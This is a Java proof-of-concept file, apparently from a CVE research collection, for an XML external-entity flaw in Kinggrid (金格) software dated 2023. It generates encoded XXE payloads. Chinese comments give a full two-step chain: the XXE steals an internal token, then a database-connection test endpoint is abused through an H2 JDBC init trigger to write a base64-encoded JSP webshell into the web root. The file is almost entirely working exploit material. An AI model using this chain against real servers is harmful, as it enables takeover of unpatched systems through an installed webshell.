package cve;

import utils.Base64Util;
import java.net.URLDecoder;
import java.net.URLEncoder;

/**
 * 金格xml外部实体注入漏洞 202308
 * 该代码用于生成发送poc的xmlvalue
 */
public class test {

    public static void main(String[] args) throws Exception {

        String s = "PCFET0NUWVBFIEFOWVs8IUVOVElUWSByb290IFNzU1RFTSAiaHR0cDovLZEyNy4wLjAuMTo2MDAwMS9hz2VudC9nzXR3YXkvcHJvzHVjzS90b2tlbj9tzXRob2Q9dG9rzW4mc2VleW9uPVQwaZVVbTB4Y1RnM1psVjNibWxHUVhCRmFuSllRV0V4TlRONWFYVXJUWEpsUZFKcVFWUnJWMDFzUW5FeWVISmhjbWRFYkzCeGFHMDNSMEztWVUxd2RXMHhzVVJ4U1dkaFJXNDNlRWhHYlRCWVNFUnFXVXRLWkhwS2MwNURXalp3VTJKNU5rMDNSRWh4SZNwdGVGTnhXa1zwWTJKUFlYRmlUSHBCUkzKNmFrVT0mc2lnbmF0dXJlPWY1MDIwzmJlODVlNGE1Y2FhzjJizjdiOTgyMTk4zjE2NWY1NWRlzmIiPl0%2BPFNpz25hdHVyzT48RmllbGQ%2BPHzhbHVlIEluzGV4PSJQcm90zWN0SXRlbSI%2BdHJ1zTwvdmFsdWU%2BPHzhbHVlIEluzGV4PSJWQUxVRSI%2BJnJvb3Q7PC92YWx1zT48L0zpzWxkPjwvU2lnbmF0dXJlPg%3D%3D";

        s = "PCFET0NUWVBFIEFOWVs8IUVOVElUWSByb290IFNzU1RFTSAizmlszTovLy8iPl0%2bPFNpz25hdHVyzT48RmllbGQ" +
                "%2bPHzhbHVlIEluzGV4PSJQcm90zWN0SXRlbSI%2bdHJ1zTwvdmFsdWU%2bPHzhbHVlIEluzGV4PSJWQUxVRSI%2bJnJvb3Q7PC92YWx1zT48L0zpzWxkPjwvU2lnbmF0dXJlPg%3d%3d";

        s= "PCFET0NUWVBFIEFOWVs8IUVOVElUWSByb290IFNzU1RFTSAiaHR0cDovLZEyNy4wLjAuMTo4ODg4Ij5dPjxTaWduYXR1cmU" +
                "%2BPEzpzWxkPjx2YWx1zSBJbmRleD0iUHJvdGVjdEl0zW0iPnRydWU8L3zhbHVlPjx2YWx1zSBJbmRleD0iVkFMVUUiPizyb290OZwvdmFsdWU%2BPC9GaWVszD48L1Npz25hdHVyzT4%3D";
        s = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0=";
        s = URLDecoder.decode(s);

        System.out.println(s);

        String output = Base64Util.decodeString(s, "UTF-8",
                "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=");
        System.out.println(output);

        String en = "<!DOCTYPE ANY[<!ENTITY root SYSTEM \"http://127.0.0.1:60001/agent/getway/produce/token?method=token&seeyon=T0k5Um0xcTg3ZlV3bmlGQXBFanJYQWExNTN5aXUrTXJlS1JqQVRrV01YQnEyeHJhcmdEbFBxaG03R0FmYU1wdW0xYURxSWdhRW43eEhGbTBYSERqWUtKZHpKc05DWjZwU2J5Nk03REhxK3pteFNxWkVpY2JPYXFiTHpBRFJ6akU=&signature=f5020fbe85e4a5caaf2bf7b982198f165f55defb\">]><Signature><Field><value Index=\"ProtectItem\">true</value><value Index=\"VALUE\">&root;</value></Field></Signature>";

        en = "<!DOCTYPE ANY[<!ENTITY root SYSTEM \"http://127.0.0.1:9999\">]><Signature><Field><value " +
                "Index=\"ProtectItem\">true</value><value Index=\"VALUE\">&root;</value></Field></Signature>";
        en = "<!DOCTYPE ANY[<!ENTITY root SYSTEM \"http://127.0.0.1:9999\">]>";
        en = Base64Util.encode(en.getBytes(), "UTF-8",
                "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=");
        System.out.println(en);

//        xmlValue 的内容：
        System.out.println(URLEncoder.encode(en));

//        利用XXE请求两次：
//        1、获取Token：获得响应中的token
//        http://127.0.0.1:60001/agent/getway/produce/admin?inside=false&seeyon=UWpRM05EWXZhemhLVm5WYUt6TkhTM0l3YVdzcmNGRnBTRzg1Y0c5dlJraEdORUZzUVVrdlV6QnNjbE51VTFKemJUQjVaRWhUVTNGalRVbDNPVkp6ZVhoeFNIWTVVMUkzUTNGT1NGbGthMFJWUWt3d1ZrODVNbE5NVXl0dGNXWndRMlpUVEZWeU1GQkhXbXhoWVdoblNVNUNOakpyTkhCeE1rSjNhWGgzVGtjPQ==&signature=ZTlkZmZiY2ZiYjAyZDllMjczNjkwNGE3NmMxNjk1NjhlMGFiYWQyYw==
//        2、获取的token进行正常base64编码后，替换ad：此为写马的shell（写入..\ApacheJetspeed\webapps\ROOT\ajax!.jsp）
//        http://127.0.0.1:60001/agent/configuration/testDBConnect?inside=true&ad=Mjc3ODI3NjkzNTk4NTM6U0JFMk1UWTVNall3T1RJek1URTVPUT09MEtI&dbType=NQ==&dbUrl=amRiYzpoMjptZW06dGVzdDtNT0RFPU1TU1FMU2VydmVyO2luaXQ9Q1JFQVRFIFRSSUdHRVIgaGhoaCBCRUZPUkUgU0VMRUNUIE9OIElORk9STUFUSU9OX1NDSEVNQS5DQVRBTE9HUyBBUyAndm9pZCB4KCkgdGhyb3dzIEV4Y2VwdGlvbnsvL2phdmFzY3JpcHQKamF2YS5pby5GaWxlT3V0cHV0U3RyZWFtIGYgPSBuZXcgamF2YS5pby5GaWxlT3V0cHV0U3RyZWFtKGphdmEubGFuZy5TeXN0ZW0uZ2V0UHJvcGVydHkoInVzZXIuZGlyIikrIi8uLi9BcGFjaGVKZXRzcGVlZC93ZWJhcHBzL1JPT1QvYWpheCEuanNwIilcO2Yud3JpdGUoamF2YS51dGlsLkJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKCJQQ1VnYW1GMllTNXBieTVKYm5CMWRGTjBjbVZoYlNCcGJpQTlJSEpsY1hWbGMzUXVaMlYwU1c1d2RYUlRkSEpsWVcwb0tUdHFZWFpoTG1sdkxrSjVkR1ZCY25KaGVVOTFkSEIxZEZOMGNtVmhiU0J6ZEhKbFlXMGdQU0J1WlhjZ2FtRjJZUzVwYnk1Q2VYUmxRWEp5WVhsUGRYUndkWFJUZEhKbFlXMG9LVHRwYm5RZ1kyZzdkMmhwYkdVZ0tDaGphQ0E5SUdsdUxuSmxZV1FvS1NrZ0lUMGdMVEVwSUh0emRISmxZVzB1ZDNKcGRHVW9ZMmdwTzMxaWVYUmxXMTBnWkdGMFlTQTlJSE4wY21WaGJTNTBiMEo1ZEdWQmNuSmhlU2dwTzJSaGRHRWdQU0JxWVhaaExuVjBhV3d1UW1GelpUWTBMbWRsZEVSbFkyOWtaWElvS1M1a1pXTnZaR1VvYW1GMllTNTFkR2xzTGtKaGMyVTJOQzVuWlhSRVpXTnZaR1Z5S0NrdVpHVmpiMlJsS0dwaGRtRXVibVYwTGxWU1RFUmxZMjlrWlhJdVpHVmpiMlJsS0c1bGR5QlRkSEpwYm1jb1pHRjBZU2tzSUNKMWRHWXRPQ0lwS1NrN1UzUnlhVzVuSUc0Z1BTQnlaWEYxWlhOMExtZGxkRkYxWlhKNVUzUnlhVzVuS0NrcklpNXFjM0FpTzJwaGRtRXVhVzh1Um1sc1pVOTFkSEIxZEZOMGNtVmhiU0JtSUQwZ2JtVjNJR3BoZG1FdWFXOHVSbWxzWlU5MWRIQjFkRk4wY21WaGJTaHlaWEYxWlhOMExtZGxkRk5sY25ac1pYUkRiMjUwWlhoMEtDa3VaMlYwVW1WaGJGQmhkR2dvSWlJcElDc2diaXdnY21WeGRXVnpkQzVuWlhSSVpXRmtaWElvSWxWelpYSXRRV2RsYm5RaUtTNWxibVJ6VjJsMGFDZ2lZWEJrSWlrcE96dG1MbmR5YVhSbEtHUmhkR0VwTzJZdVkyeHZjMlVvS1R0eVpYTndiMjV6WlM1elpYUklaV0ZrWlhJb0lsWnBZU0lzSUhKbGNYVmxjM1F1WjJWMFVYVmxjbmxUZEhKcGJtY29LU2s3SlQ0PSIpKVw7Zi5jbG9zZSgpXDt9Jw==&driverClass=b3JnLmgyLkRyaXZlcg%3d%3d
//        需要注意的是Token用一次即失效
    }
}
